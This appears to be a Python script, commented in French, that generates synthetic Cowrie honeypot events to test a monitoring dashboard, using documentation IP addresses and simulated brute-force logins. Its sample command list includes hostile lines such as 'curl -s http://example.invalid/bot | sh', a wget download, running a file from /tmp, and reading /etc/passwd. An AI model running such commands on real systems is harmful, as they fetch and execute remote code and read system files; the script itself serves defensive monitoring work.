#!/usr/bin/env python3
"""Genere des donnees SYNTHETIQUES pour tester le dashboard sans honeypot.

Les adresses viennent de la plage reservee a la documentation (RFC 5737) et les
positions sont les centres approximatifs des pays, avec un peu de bruit.
Aucune de ces attaques n'est reelle : stats.json est marque "demo": true.
"""
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

import parse

# (nom, latitude, longitude, nombre d'IP)
COUNTRIES = [
    ("Chine", 35.9, 104.2, 10), ("Russie", 61.5, 105.3, 8), ("États-Unis", 37.1, -95.7, 8),
    ("Brésil", -14.2, -51.9, 5), ("Inde", 20.6, 78.9, 5), ("Vietnam", 14.1, 108.3, 4),
    ("Allemagne", 51.2, 10.5, 3), ("Pays-Bas", 52.1, 5.3, 3), ("Corée du Sud", 35.9, 127.8, 3),
    ("Indonésie", -0.8, 113.9, 3), ("France", 46.2, 2.2, 2), ("Singapour", 1.35, 103.8, 2),
]
USERS = ["root", "admin", "ubuntu", "user", "test", "oracle", "postgres", "pi", "guest", "ftpuser"]
PASSWORDS = ["123456", "admin", "password", "root", "12345678", "qwerty", "1234", "toor",
             "raspberry", "changeme", "admin123", "test"]
COMMANDS = ["uname -a", "whoami", "cat /proc/cpuinfo", "ls -la", "free -m", "cat /etc/passwd",
            "wget http://example.invalid/x.sh", "curl -s http://example.invalid/bot | sh",
            "cd /tmp; chmod +x x.sh; ./x.sh"]


def make_events(rng, ips):
    start = datetime(2026, 10, 16, tzinfo=timezone.utc)

    def ev(kind, t, ip, **extra):
        return {"eventid": kind, "timestamp": t.isoformat().replace("+00:00", "Z"), "src_ip": ip, **extra}

    for day in range(14):
        for ip in ips:
            if rng.random() > 0.55:
                continue
            for _ in range(rng.randint(1, 4)):
                t = start + timedelta(days=day, seconds=rng.randint(0, 86399))
                yield ev("cowrie.session.connect", t, ip)
                ok = False
                for _ in range(rng.randint(1, 8)):
                    ok = rng.random() < 0.1
                    yield ev("cowrie.login.success" if ok else "cowrie.login.failed", t, ip,
                             username=rng.choices(USERS, range(len(USERS), 0, -1))[0],
                             password=rng.choices(PASSWORDS, range(len(PASSWORDS), 0, -1))[0])
                    if ok:
                        break
                if ok:
                    for _ in range(rng.randint(0, 4)):
                        yield ev("cowrie.command.input", t, ip, input=rng.choice(COMMANDS))


def main():
    rng = random.Random(42)
    geo, n = {}, 0
    for name, lat, lon, count in COUNTRIES:
        for _ in range(count):
            n += 1
            geo[f"203.0.113.{n}"] = {"country": name, "lat": lat + rng.uniform(-4, 4), "lon": lon + rng.uniform(-4, 4)}
    stats = parse.summarize(list(make_events(rng, list(geo))), geo, demo=True)
    out = Path(__file__).resolve().parent.parent / "dashboard" / "stats.json"
    out.write_text(json.dumps(stats, ensure_ascii=False, indent=1), encoding="utf-8")
    print(f"{out} : donnees de demo ({stats['totals']['sessions']} sessions synthetiques)")


if __name__ == "__main__":
    main()
